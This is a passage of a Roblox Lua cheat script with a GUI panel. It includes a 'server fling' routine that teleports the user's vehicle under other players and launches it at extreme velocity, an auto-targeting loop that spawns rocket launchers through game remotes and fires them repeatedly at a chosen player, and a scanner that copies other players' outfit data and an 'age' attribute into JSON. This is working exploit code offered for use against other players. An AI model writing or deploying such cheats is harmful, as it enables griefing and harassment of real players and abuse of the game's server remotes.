                local tChar = plr.Character
                local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
                local tHum = tChar and tChar:FindFirstChildOfClass("Humanoid")
                
                -- Dead or no character
                if not tChar or not tRoot or not tHum then 
                    updateStatus("⏩ Skipped " .. plr.Name .. " (No Char)", Color3.fromRGB(120, 120, 120))
                    continue 
                end
                
                -- Void or Sky
                if tRoot.Position.Y < -40 or tRoot.Position.Y > 400 then
                    updateStatus("⏩ Skipped " .. plr.Name .. " (Void/Sky)", Color3.fromRGB(120, 120, 120))
                    continue
                end
                
                -- Sitting Logic (Ignore normal chairs, attack vehicles)
                if tHum.Sit and tHum.SeatPart then
                    local isSittingInCar = false
                    local vehicleAncestor = tHum.SeatPart:FindFirstAncestorOfClass("Model")
                    if vehiclesFolder and vehicleAncestor and vehicleAncestor:IsDescendantOf(vehiclesFolder) then
                        isSittingInCar = true
                    end
                    
                    if not isSittingInCar then
                        updateStatus("🪑 Skipped " .. plr.Name .. " (In Chair)", Color3.fromRGB(200, 150, 50))
                        continue
                    end
                end

                -- Lock onto target
                massFlingTarget = plr
                updateStatus("🎯 Targeting: " .. plr.Name, Color3.fromRGB(200, 200, 50))
                
                local ticks = 0
                local wasFlung = false
                
                -- Bomb them fast (max ~0.3 seconds before giving up)
                while isMassFlinging and massFlingTarget == plr and ticks < 10 do
                    task.wait(0.03) 
                    ticks = ticks + 1
                    
                    local currentRoot = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
                    -- Stop hitting if they fall out of bounds or their velocity spikes heavily
                    if not currentRoot or currentRoot.Velocity.Magnitude > 300 or currentRoot.Position.Y < -40 or currentRoot.Position.Y > 400 then
                        wasFlung = true
                        break 
                    end
                end
                
                if wasFlung then
                    updateStatus("💥 Flung: " .. plr.Name, Color3.fromRGB(50, 200, 100))
                else
                    updateStatus("⚠️ Timeout: " .. plr.Name, Color3.fromRGB(200, 100, 100))
                end
            end
            
            updateStatus("⏳ List finished. Restarting...", Color3.fromRGB(100, 150, 255))
            task.wait(0.5) 
        end
    end)

    -- 2. DESYNC, AUTO-REMOUNT, AND AUTO-RESPAWN
    massFlingLoop = RunService.Heartbeat:Connect(function()
        if not isMassFlinging then return end
        if isRespawningVehicle then return end
        
            -- AUTO-RESPAWN: If car gets sent to the void or despawns
        if not car or not car.Parent or not base or not base.Parent then
            isRespawningVehicle = true
            task.spawn(function()
                updateStatus("⚠️ Car Lost! Respawning " .. lastVehicleName .. "...", Color3.fromRGB(255, 120, 50))
                
                -- Foolproof Flames Hub Net Fetcher
                pcall(function()
                    local g = getgenv()
                    local Net = g.Net
                    if not Net then
                        local core = game:GetService("ReplicatedStorage"):FindFirstChild("Core", true)
                        if core and core:FindFirstChild("Net") then Net = require(core.Net) end
                    end
                    if Net and type(Net.get) == "function" then
                        Net.get("spawn_vehicle", lastVehicleName)
                    elseif g.Get then
                        g.Get("spawn_vehicle", lastVehicleName)
                    end
                end)
                
                task.wait(2.5) -- Wait for network to drop the vehicle
                
                car = getMyVehicle()
                if car then
                    base = car.PrimaryPart or car:FindFirstChild("Base")
                    -- Re-apply max density
                    for _, part in ipairs(car:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.CustomPhysicalProperties = PhysicalProperties.new(100, 0, 0, 100, 100)
                            part.CanCollide = true
                        end
                    end
                    updateStatus("✅ Car Respawned. Remounting...", Color3.fromRGB(50, 200, 100))
                else
                    updateStatus("❌ Failed to respawn vehicle.", Color3.fromRGB(255, 50, 50))
                end
                isRespawningVehicle = false
            end)
            return
        end

        -- AUTO-REMOUNT: If you get detached from the seat
        if hum and not hum.SeatPart then
            local myRoot = char:FindFirstChild("HumanoidRootPart")
            local vehicleSeat = car:FindFirstChildOfClass("VehicleSeat") or car:FindFirstChildWhichIsA("Seat", true)
            
            if myRoot and vehicleSeat then
                base.Velocity = Vector3.zero
                base.RotVelocity = Vector3.zero
                
                -- Teleport directly above the seat cushion
                myRoot.CFrame = vehicleSeat.CFrame * CFrame.new(0, 1.5, 0)
                
                -- Force sit via Roblox API
                vehicleSeat:Sit(hum)
                
                -- Force sit via Flames Hub native remote
                pcall(function()
                    local g = getgenv()
                    local Net = g.Net
                    if not Net then
                        local core = game:GetService("ReplicatedStorage"):FindFirstChild("Core", true)
                        if core and core:FindFirstChild("Net") then Net = require(core.Net) end
                    end
                    if Net and type(Net.get) == "function" then
                        Net.get("sit", vehicleSeat)
                    elseif g.Get then
                        g.Get("sit", vehicleSeat)
                    end
                end)
            end
            return -- Skip attack phase while trying to sit
        end

        local tRoot = massFlingTarget and massFlingTarget.Character and massFlingTarget.Character:FindFirstChild("HumanoidRootPart")
        local tHum = massFlingTarget and massFlingTarget.Character and massFlingTarget.Character:FindFirstChildOfClass("Humanoid")
        
        local strikeTarget = tRoot
        if tHum and tHum.Sit and tHum.SeatPart then
            strikeTarget = tHum.SeatPart
        end
        
        if strikeTarget then
            -- THE SAFE ZONE: Hidden 45 studs directly beneath the target (deep enough to bypass water)
            local undergroundPos = strikeTarget.CFrame * CFrame.new(0, -45, 0)
            
            -- THE STRIKE ZONE: Placed directly onto them from beneath
            local strikePos = strikeTarget.CFrame * CFrame.new(0, -1.5, 0)
            
            -- Teleport to strike zone and launch UPWARD
            base.CFrame = strikePos
            base.Velocity = Vector3.new(math.random(-50000, 50000), 50000, math.random(-50000, 50000)) 
            base.RotVelocity = Vector3.new(50000, 50000, 50000)
            
            RunService.RenderStepped:Wait()
            
            if base and not isRespawningVehicle then
                base.CFrame = undergroundPos
                base.Velocity = Vector3.zero
                base.RotVelocity = Vector3.zero
            end
        else
            local myRoot = char:FindFirstChild("HumanoidRootPart")
            if myRoot then
                base.CFrame = myRoot.CFrame * CFrame.new(0, -45, 0)
                base.Velocity = Vector3.zero
                base.RotVelocity = Vector3.zero
            end
        end
    end)
    
    return true
end

MassFlingBtn.MouseButton1Click:Connect(function()
    if isMassFlinging then
        MassFlingBtn.Text = "START SERVER FLING"
        MassFlingBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        stopMassFling()
    else
        local success = startMassFling()
        if success then
            MassFlingBtn.Text = "STOP SERVER FLING"
            MassFlingBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        else
            MassFlingBtn.Text = "⚠️ SIT IN DRIVER SEAT FIRST"
            MassFlingBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 0)
            task.wait(1.5)
            MassFlingBtn.Text = "START SERVER FLING"
            MassFlingBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        end
    end
end)




-- Resize Handle (Bottom Right Corner)
local ResizeHandle = Instance.new("TextButton")
ResizeHandle.Name = "ResizeHandle"
ResizeHandle.Size = UDim2.new(0, 15, 0, 15)
ResizeHandle.Position = UDim2.new(1, -15, 1, -15)
ResizeHandle.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
ResizeHandle.Text = "↘"
ResizeHandle.TextColor3 = Color3.fromRGB(15, 15, 18)
ResizeHandle.Font = Enum.Font.SourceSansBold
ResizeHandle.TextSize = 14
ResizeHandle.BorderSizePixel = 0
ResizeHandle.ZIndex = 10
ResizeHandle.Parent = MainFrame

-- Resizing Logic
local isResizing = false
local dragStart
local startSize
local minWidth = 320
local minHeight = 250

ResizeHandle.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isResizing = true
        dragStart = input.Position
        startSize = MainFrame.AbsoluteSize
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if isResizing and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        local newWidth = math.max(minWidth, startSize.X + delta.X)
        local newHeight = math.max(minHeight, startSize.Y + delta.Y)
        MainFrame.Size = UDim2.new(0, newWidth, 0, newHeight)
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isResizing = false
    end
end)

-- Window Controls Logic
local minimized = false
local savedSize = MainFrame.Size

MinBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    if minimized then
        savedSize = MainFrame.Size 
        MainFrame.Size = UDim2.new(0, MainFrame.AbsoluteSize.X, 0, 35)
        ResizeHandle.Visible = false
    else
        MainFrame.Size = savedSize 
        ResizeHandle.Visible = true
    end
end)

CloseBtn.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- We need to forward-declare the populate function so the button can call it
local populateSavedOutfits

BackBtn.MouseButton1Click:Connect(function()
    AssetScroll.Visible = false
    SavedScroll.Visible = false
    ToolsScroll.Visible = false
    PlayerScroll.Visible = true
    
    BackBtn.Visible = false
    RefreshBtn.Visible = true
    SavedTabBtn.Visible = true
    ToolsTabBtn.Visible = true
    Title.Text = "🧬 Deep Live Outfit Scanner"
end)

SavedTabBtn.MouseButton1Click:Connect(function()
    AssetScroll.Visible = false
    PlayerScroll.Visible = false
    ToolsScroll.Visible = false
    SavedScroll.Visible = true
    
    BackBtn.Visible = true
    RefreshBtn.Visible = false
    SavedTabBtn.Visible = false
    ToolsTabBtn.Visible = false
    Title.Text = "📁 Saved Outfits"
    if populateSavedOutfits then populateSavedOutfits() end
end)

ToolsTabBtn.MouseButton1Click:Connect(function()
    AssetScroll.Visible = false
    PlayerScroll.Visible = false
    SavedScroll.Visible = false
    ToolsScroll.Visible = true
    
    BackBtn.Visible = true
    RefreshBtn.Visible = false
    SavedTabBtn.Visible = false
    ToolsTabBtn.Visible = false
    Title.Text = "🛠️ Utility Tools"
end)


local function createDetailedAssetCard(categoryName, assetId, rawPropertySource)
    local numericId = tonumber(assetId)
    if not numericId then return end

    local CardFrame = Instance.new("Frame")
    CardFrame.Size = UDim2.new(1, -5, 0, 105)
    CardFrame.BackgroundColor3 = Color3.fromRGB(24, 24, 30)
    CardFrame.BorderSizePixel = 0
    CardFrame.LayoutOrder = 5
    CardFrame.Parent = AssetScroll

    local PreviewImg = Instance.new("ImageLabel")
    PreviewImg.Size = UDim2.new(0, 95, 0, 95)
    PreviewImg.Position = UDim2.new(0, 5, 0, 5)
    PreviewImg.BackgroundColor3 = Color3.fromRGB(12, 12, 15)
    PreviewImg.Image = "rbxthumb://type=Asset&id=" .. tostring(numericId) .. "&w=150&h=150"
    PreviewImg.Parent = CardFrame

    local CategoryLabel = Instance.new("TextLabel")
    CategoryLabel.Size = UDim2.new(1, -115, 0, 15)
    CategoryLabel.Position = UDim2.new(0, 110, 0, 6)
    CategoryLabel.Text = "[" .. categoryName:upper() .. "]"
    CategoryLabel.TextColor3 = Color3.fromRGB(0, 255, 200)
    CategoryLabel.Font = Enum.Font.SourceSansBold
    CategoryLabel.TextSize = 13
    CategoryLabel.TextXAlignment = Enum.TextXAlignment.Left
    CategoryLabel.BackgroundTransparency = 1
    CategoryLabel.Parent = CardFrame

    local NameLabel = Instance.new("TextLabel")
    NameLabel.Size = UDim2.new(1, -115, 0, 18)
    NameLabel.Position = UDim2.new(0, 110, 0, 22)
    NameLabel.Text = "Querying item database..."
    NameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    NameLabel.Font = Enum.Font.SourceSans
    NameLabel.TextSize = 14
    NameLabel.TextXAlignment = Enum.TextXAlignment.Left
    NameLabel.BackgroundTransparency = 1
    NameLabel.Parent = CardFrame

    local CreatorLabel = Instance.new("TextLabel")
    CreatorLabel.Size = UDim2.new(1, -155, 0, 15)
    CreatorLabel.Position = UDim2.new(0, 110, 0, 42)
    CreatorLabel.Text = "Creator: Fetching..."
    CreatorLabel.TextColor3 = Color3.fromRGB(160, 160, 170)
    CreatorLabel.Font = Enum.Font.SourceSansItalic
    CreatorLabel.TextSize = 12
    CreatorLabel.TextXAlignment = Enum.TextXAlignment.Left
    CreatorLabel.BackgroundTransparency = 1
    CreatorLabel.Parent = CardFrame

    local CreatorIcon = Instance.new("ImageLabel")
    CreatorIcon.Size = UDim2.new(0, 28, 0, 28)
    CreatorIcon.Position = UDim2.new(1, -40, 0, 38)
    CreatorIcon.BackgroundTransparency = 1
    CreatorIcon.Parent = CardFrame

    local SourceLabel = Instance.new("TextLabel")
    SourceLabel.Size = UDim2.new(1, -115, 0, 15)
    SourceLabel.Position = UDim2.new(0, 110, 0, 58)
    SourceLabel.Text = "Source: " .. rawPropertySource
    SourceLabel.TextColor3 = Color3.fromRGB(255, 180, 0)
    SourceLabel.Font = Enum.Font.Code
    SourceLabel.TextSize = 11
    SourceLabel.TextXAlignment = Enum.TextXAlignment.Left
    SourceLabel.BackgroundTransparency = 1
    SourceLabel.Parent = CardFrame

    local IdBox = Instance.new("TextBox")
    IdBox.Size = UDim2.new(1, -115, 0, 22)
    IdBox.Position = UDim2.new(0, 110, 0, 76)
    IdBox.Text = tostring(numericId)
    IdBox.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    IdBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    IdBox.Font = Enum.Font.Code
    IdBox.TextSize = 12
    IdBox.ClearTextOnFocus = false
    IdBox.TextEditable = true
    IdBox.Parent = CardFrame

    task.spawn(function()
        local success, info = pcall(function()
            return MarketplaceService:GetProductInfo(numericId, Enum.InfoType.Asset)
        end)
        
        if not success or not info or info.Name == "" then
            pcall(function()
                local collection = InsertService:GetInboundExtensionIds(numericId)
                if collection and #collection > 0 then
                    local alternativeId = collection[1]
                    local altSuccess, altInfo = pcall(function()
                        return MarketplaceService:GetProductInfo(alternativeId, Enum.InfoType.Asset)
                    end)
                    if altSuccess and altInfo then info = altInfo success = true end
                end
            end)
        end

        if success and info then
            NameLabel.Text = info.Name ~= "" and info.Name or "Unnamed Asset Component"
            CreatorLabel.Text = "By: " .. (info.Creator and info.Creator.Name or "Roblox")
            if info.Creator and info.Creator.Id and type(info.Creator.Id) == "number" then
                local ok, thumb = pcall(function()
                    return Players:GetUserThumbnailAsync(info.Creator.Id, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
                end)
                if ok and thumb then
                    CreatorIcon.Image = thumb
                end
            end
        else
            NameLabel.Text = "Layered Mesh Component"
            CreatorLabel.Text = "Creator: Engine Hidden"
        end
    end)
end
-- ========== AUTO-RL TARGETING SYSTEM (ULTRA-SECURE & CRASH-PROOF) ==========
local autoRLTarget = nil
local isAutoFiring = false

-- 🛡️ Target Validation
local function isValidTarget(targ)
    if not targ then return false end
    local success, isValid = pcall(function()
        if not targ.Parent then return false end 
        local char = targ.Character
        if not char or not char.Parent then return false end
        if not char:FindFirstChild("HumanoidRootPart") then return false end
        local hum = char:FindFirstChild("Humanoid")
        if hum and hum.Health <= 0 then return false end
        return true
    end)
    return success and isValid
end

task.spawn(function()
    while true do
        task.wait(0.1) 
        
        local player = game:GetService("Players").LocalPlayer
        local char = player.Character
        local bp = player:FindFirstChild("Backpack")
        
        if isValidTarget(autoRLTarget) then
            if not isAutoFiring then
                isAutoFiring = true
                
                -- 🛑 ANTI-CONFLICT: Turn off Rapid Fire
                if noCooldownEnabled then
                    noCooldownEnabled = false
                    if NoCooldownBtn then
                        NoCooldownBtn.Text = "⚡ Rapid Fire: OFF"
                        NoCooldownBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
                    end
                end
                
                local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
                
                -- Clear inventory
                pcall(function()
                    if Send then Send("delete_tool") end
                    if char then
                        for _, v in ipairs(char:GetChildren()) do
                            if v:IsA("Tool") and v.Name == "RocketLauncher" then v:Destroy() end
                        end
                    end
                    if bp then
                        for _, v in ipairs(bp:GetChildren()) do
                            if v.Name == "RocketLauncher" then v:Destroy() end
                        end
                    end
                end)
                
                -- 💥 THE SYNCHRONIZED LOOP
                while isAutoFiring do
                    local currentChar = player.Character
                    local currentBp = player:FindFirstChild("Backpack")
                    
                    -- Break immediately if YOU die or TARGET dies
                    if not isValidTarget(autoRLTarget) or not currentChar or not currentChar.Parent or not currentBp then
                        break
                    end
                    
                    -- Check if we already have a launcher (fixes rate-limit spam)
                    local newLauncher = currentChar:FindFirstChild("RocketLauncher") or currentBp:FindFirstChild("RocketLauncher")
                    
                    if not newLauncher then
                        if Send then Send("get_tool", "RocketLauncher") end
                        
                        -- Custom Wait: Checks both Backpack AND Character simultaneously for 0.2s
                        local timer = 0
                        while timer < 0.2 do
                            newLauncher = currentChar:FindFirstChild("RocketLauncher") or currentBp:FindFirstChild("RocketLauncher")
                            if newLauncher then break end
                            timer = timer + task.wait(0.01)
                        end
                    end
                    
                    if newLauncher then
                        -- PROTECTED EQUIP: Prevents the Thread Crash if you die while equipping
                        local equipSuccess = pcall(function()
                            newLauncher.Parent = currentChar
                        end)
                        
                        if equipSuccess then
                            local handle = newLauncher:FindFirstChild("Handle")
                            local spawnPos = handle and handle.Position or (currentChar:GetPivot().Position + Vector3.new(0, 2, 0))
                            
                            -- PROTECTED AIM
                            local aimSuccess, targetCFrame = pcall(function()
                                return CFrame.new(spawnPos, autoRLTarget.Character.HumanoidRootPart.Position)
                            end)
                            
                            if aimSuccess and targetCFrame then
                                if Send then Send("shoot_rocket", newLauncher, targetCFrame) end
                            end
                        end
                        
                        -- PROTECTED DELETE
                        pcall(function()
                            if Send then Send("delete_tool") end
                            newLauncher:Destroy()
                        end)
                    else
                        -- If the server lagged and didn't give a tool, wait slightly so we don't spam the network
                        task.wait(0.05)
                    end
                    
                    task.wait(0.01) 
                end
                
                isAutoFiring = false
                if Send then Send("get_tool", "RocketLauncher") end
            end
        else
            if autoRLTarget and not autoRLTarget.Parent then
                autoRLTarget = nil
            end
            isAutoFiring = false
        end
    end
end)

-- Scan Logic (Now accepts frozen snapshot data)
local function deepScanPlayerOutfit(targetPlayer, cachedDescription)
    for _, child in pairs(AssetScroll:GetChildren()) do
        if child:IsA("Frame") then child:Destroy() end
    end
    
    Title.Text = "🧬 Scanning: " .. targetPlayer.DisplayName
    PlayerScroll.Visible = false
    AssetScroll.Visible = true
    RefreshBtn.Visible = false
    BackBtn.Visible = true

    -- Use the frozen snapshot. If they weren't loaded during refresh, fallback to live.
    local description = cachedDescription
    if not description then
        local liveChar = targetPlayer.Character or Workspace:FindFirstChild(targetPlayer.Name)
        local humanoid = liveChar and liveChar:FindFirstChildOfClass("Humanoid")
        if humanoid then
            pcall(function() description = humanoid:GetAppliedDescription() end)
        end
    end

    if not description then return end -- Abort if no data could be found

    local avatarFrame = Instance.new("Frame")
    avatarFrame.Size = UDim2.new(1, -5, 0, 250)
    avatarFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
    avatarFrame.BorderSizePixel = 1
    avatarFrame.BorderColor3 = Color3.fromRGB(0, 255, 150)
    avatarFrame.LayoutOrder = 1
    avatarFrame.Parent = AssetScroll

      local bigViewport = Instance.new("ViewportFrame")
    bigViewport.Size = UDim2.new(1, 0, 1, 0)
    bigViewport.BackgroundTransparency = 1
    bigViewport.Parent = avatarFrame

    -- [NEW] WorldModel fixes Layered Clothing glitches!
    local worldModel = Instance.new("WorldModel")
    worldModel.Parent = bigViewport

    -- Viewport generation using the frozen snapshot (Immune to live changes!)
    task.spawn(function()
        local charClone
        local success = pcall(function()
            -- Builds a fresh dummy using the frozen snapshot data
            charClone = Players:CreateHumanoidModelFromDescription(description, Enum.HumanoidRigType.R15)
        end)
        
        -- Fallback if Roblox's API fails
        if not success or not charClone then
            pcall(function()
                local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
                local oldArch = myChar.Archivable
                myChar.Archivable = true
                charClone = myChar:Clone()
                myChar.Archivable = oldArch
                local hum = charClone:FindFirstChildOfClass("Humanoid")
                if hum then hum:ApplyDescription(description) end
            end)
        end

        if charClone then
            for _, v in pairs(charClone:GetDescendants()) do
                if v:IsA("Script") or v:IsA("LocalScript") then
                    v:Destroy()
                end
            end
            
            -- [NEW] Center the model at 0,0,0 to stop camera rendering glitches
            charClone:PivotTo(CFrame.new(0, 0, 0))
            
            -- [NEW] Parent the avatar to the WorldModel, NOT the Viewport directly!
            charClone.Parent = worldModel
            
            local camera = Instance.new("Camera")
            camera.Parent = bigViewport
            
            local hrp = charClone:FindFirstChild("HumanoidRootPart") or charClone:FindFirstChild("Torso") or charClone:FindFirstChild("UpperTorso")
            if hrp then
                camera.CFrame = hrp.CFrame * CFrame.new(0, 0.5, -6) * CFrame.Angles(0, math.pi, 0)
                camera.Focus = hrp.CFrame
            end
            
            bigViewport.CurrentCamera = camera
        end
    end)

  
    do
        local infoFrame = Instance.new("Frame")
        infoFrame.Size = UDim2.new(1, -5, 0, 80)
        infoFrame.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
        infoFrame.BorderSizePixel = 0
      infoFrame.LayoutOrder = 3
        infoFrame.Parent = AssetScroll

        local infoTitle = Instance.new("TextLabel")
        infoTitle.Size = UDim2.new(1, -10, 0, 20)
        infoTitle.Position = UDim2.new(0, 5, 0, 6)
        infoTitle.Text = "Avatar Info"
        infoTitle.BackgroundTransparency = 1
        infoTitle.TextColor3 = Color3.fromRGB(0, 255, 200)
        infoTitle.Font = Enum.Font.SourceSansBold
        infoTitle.TextSize = 14
        infoTitle.TextXAlignment = Enum.TextXAlignment.Left
        infoTitle.Parent = infoFrame

        local rigLabel = Instance.new("TextLabel")
        rigLabel.Size = UDim2.new(1, -10, 0, 16)
        rigLabel.Position = UDim2.new(0, 5, 0, 28)
        local rigText = "Rig: "
        pcall(function()
            rigText = rigText .. tostring(humanoid.RigType and tostring(humanoid.RigType):gsub("Enum.HumanoidRigType.", "") or "Unknown")
        end)
        rigLabel.Text = rigText
        rigLabel.BackgroundTransparency = 1
        rigLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        rigLabel.Font = Enum.Font.SourceSans
        rigLabel.TextSize = 12
        rigLabel.TextXAlignment = Enum.TextXAlignment.Left
        rigLabel.Parent = infoFrame

        local function safeGet(prop)
            local ok, val = pcall(function() return description[prop] end)
            if ok and val ~= nil then return val else return nil end
        end

        local headScale = safeGet("HeadScale")
        local heightScale = safeGet("HeightScale")
        local widthScale = safeGet("WidthScale")
        local bodyTypeScale = safeGet("BodyTypeScale")
        local proportionScale = safeGet("ProportionScale")

        local scalesText = "HeadScale: " .. tostring(headScale or "N/A")
                        .. "  HeightScale: " .. tostring(heightScale or "N/A")
                        .. "\nWidthScale: " .. tostring(widthScale or "N/A")
                        .. "  BodyTypeScale: " .. tostring(bodyTypeScale or "N/A")
                        .. "  ProportionScale: " .. tostring(proportionScale or "N/A")

        local scalesLabel = Instance.new("TextLabel")
        scalesLabel.Size = UDim2.new(1, -10, 0, 34)
        scalesLabel.Position = UDim2.new(0, 5, 0, 44)
        scalesLabel.Text = scalesText
        scalesLabel.BackgroundTransparency = 1
        scalesLabel.TextColor3 = Color3.fromRGB(190, 190, 200)
        scalesLabel.Font = Enum.Font.Code
        scalesLabel.TextSize = 12
        scalesLabel.TextXAlignment = Enum.TextXAlignment.Left
        scalesLabel.TextWrapped = true
        scalesLabel.Parent = infoFrame

        local outfitData = {}
        local function getVal(prop)
            local ok, val = pcall(function() return description[prop] end)
            if not ok or val == nil then return nil end
            return val
        end

          outfitData.SwimAnimation = getVal("SwimAnimation")
        
        -- FIXED: Grab the actual HeadColor to use as the overall SkinTone
        local hc = getVal("HeadColor")
        if typeof(hc) == "Color3" then
            outfitData.SkinTone = {hc.R, hc.G, hc.B}
        end
        
        outfitData.Face = getVal("Face")

        outfitData.JumpAnimation = getVal("JumpAnimation")
        outfitData.ClimbAnimation = getVal("ClimbAnimation")
        outfitData.Shirt = getVal("Shirt")
        outfitData.Pants = getVal("Pants")
        outfitData.RightArm = getVal("RightArm")
   
outfitData.WalkAnimation = getVal("WalkAnimation")
        task.wait(0.1)
outfitData.WalkAnimation = getVal("WalkAnimation")

        outfitData.Head = getVal("Head")
        outfitData.WidthScale = widthScale
        outfitData.GraphicTShirt = getVal("GraphicTShirt")

      -- Pull the custom age attribute directly from the player being scanned
        local targetAge = targetPlayer:GetAttribute("age")
        if targetAge then 
            outfitData.Age = tostring(targetAge) 
        end
        
        outfitData.RunAnimation = getVal("RunAnimation")
        outfitData.FallAnimation = getVal("FallAnimation")
        outfitData.IdleAnimation = getVal("IdleAnimation")
        outfitData.Accessories = {}

        pcall(function()
            local accs = description:GetAccessories(true)
            if accs and type(accs) == "table" then
                for _, a in pairs(accs) do
                    table.insert(outfitData.Accessories, {
                        AssetId = a.AssetId,
                        IsLayered = a.IsLayered,
                        AccessoryType = a.AccessoryType and tostring(a.AccessoryType):gsub("Enum.AccessoryType.", "") or a.AccessoryType
                    })
                end
            end
        end)

        outfitData.LeftArm = getVal("LeftArm")
        outfitData.RightLeg = getVal("RightLeg")
        outfitData.HeightScale = heightScale

        outfitData.BodyTypeScale = bodyTypeScale
        outfitData.ProportionScale = proportionScale
        outfitData.HeadScale = headScale

        outfitData.Torso = getVal("Torso")
        outfitData.LeftLeg = getVal("LeftLeg")

             local safeOutfit = {}
        for k, v in pairs(outfitData) do
            if typeof(v) == "Instance" or typeof(v) == "EnumItem" then
                safeOutfit[k] = tostring(v)
            else
                safeOutfit[k] = v
            end
        end
        
        -- INJECT THE TIMESTAMP: Save the exact Unix time this was scanned
        safeOutfit.SavedAtTime = os.time()

        local ok, jsonText = pcall(function()
            return HttpService:JSONEncode(safeOutfit)
        end)

        -- Action Panel & Raw JSON Output Box
            -- Raw JSON Output Box
        local rawFrame = Instance.new("Frame")
        rawFrame.Size = UDim2.new(1, -5, 0, 165) 
        rawFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
        rawFrame.BorderSizePixel = 0
        rawFrame.LayoutOrder = 4 -- Puts JSON at the very bottom
        rawFrame.Parent = AssetScroll

        local rawTitle = Instance.new("TextLabel")
        rawTitle.Size = UDim2.new(1, -10, 0, 18)
        rawTitle.Position = UDim2.new(0, 5, 0, 6)
        rawTitle.Text = "Raw JSON Data"
        rawTitle.BackgroundTransparency = 1
        rawTitle.TextColor3 = Color3.fromRGB(0, 255, 200)
        rawTitle.Font = Enum.Font.SourceSansBold
        rawTitle.TextSize = 13
        rawTitle.TextXAlignment = Enum.TextXAlignment.Left
        rawTitle.Parent = rawFrame

        local rawBox = Instance.new("TextBox")
        rawBox.Size = UDim2.new(1, -10, 0, 130)
        rawBox.Position = UDim2.new(0, 5, 0, 26)
        rawBox.Text = ok and jsonText or "{}"
        rawBox.TextWrapped = true
        rawBox.TextXAlignment = Enum.TextXAlignment.Left
        rawBox.TextYAlignment = Enum.TextYAlignment.Top
        rawBox.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
        rawBox.TextColor3 = Color3.fromRGB(220, 220, 220)
        rawBox.Font = Enum.Font.Code
        rawBox.TextSize = 11
        rawBox.ClearTextOnFocus = false
        rawBox.TextEditable = false
        rawBox.TextScaled = false
        rawBox.MultiLine = true
        rawBox.Parent = rawFrame

        -- ==========================================
        -- NEW ACTION PANEL (Moved Above Avatar Info!)
        -- ==========================================
        local actionFrame = Instance.new("Frame")
        actionFrame.Size = UDim2.new(1, -5, 0, 60)
        actionFrame.BackgroundTransparency = 1
        actionFrame.LayoutOrder = 2 -- Magically places it right below the 3D Avatar!
        actionFrame.Parent = AssetScroll

        -- Button Layout Container
        local actionLayout = Instance.new("Frame")
        actionLayout.Size = UDim2.new(1, -10, 1, 0)
        actionLayout.Position = UDim2.new(0, 5, 0, 0)
        actionLayout.BackgroundTransparency = 1
        actionLayout.Parent = actionFrame

        -- Grid Layout specifically designed for 4 buttons per row
        local uigrid = Instance.new("UIGridLayout")
        uigrid.CellSize = UDim2.new(0.235, 0, 0, 26) 
        uigrid.CellPadding = UDim2.new(0.02, 0, 0.08, 0)
        uigrid.SortOrder = Enum.SortOrder.LayoutOrder
        uigrid.FillDirectionMaxCells = 4
        uigrid.Parent = actionLayout

        -- ==========================================
        -- ROW 1: COPY, SAVE, TRY ON, TRY & SHARE
        -- ==========================================
    local copyBtn = Instance.new("TextButton")
        copyBtn.Text = "Copy JSON"
        copyBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 90)
        copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        copyBtn.Font = Enum.Font.SourceSansBold
        copyBtn.TextSize = 11
        copyBtn.BorderSizePixel = 0
        copyBtn.LayoutOrder = 1
        copyBtn.Parent = actionLayout

        local saveBtn = Instance.new("TextButton")
        saveBtn.Text = "Save File"
        saveBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        saveBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        saveBtn.Font = Enum.Font.SourceSansBold
        saveBtn.TextSize = 11
        saveBtn.BorderSizePixel = 0
        saveBtn.LayoutOrder = 2
        saveBtn.Parent = actionLayout

        local wearBtn = Instance.new("TextButton")
        wearBtn.Text = "Try On"
        wearBtn.BackgroundColor3 = Color3.fromRGB(249, 180, 0)
        wearBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
        wearBtn.Font = Enum.Font.SourceSansBold
        wearBtn.TextSize = 11
        wearBtn.BorderSizePixel = 0
        wearBtn.LayoutOrder = 3
        wearBtn.Parent = actionLayout

        local tryShareBtn = Instance.new("TextButton")
        tryShareBtn.Text = "Share All"
        tryShareBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 200)
        tryShareBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        tryShareBtn.Font = Enum.Font.SourceSansBold
        tryShareBtn.TextSize = 11
        tryShareBtn.BorderSizePixel = 0
        tryShareBtn.LayoutOrder = 4
        tryShareBtn.Parent = actionLayout

        -- ==========================================
        -- ROW 2: VIEW, WHITELIST
        -- ==========================================
        local viewBtn = Instance.new("TextButton")
        -- Smart Check: Make it red if already viewing this player
        if isViewing and selectedSpectateTarget == targetPlayer then
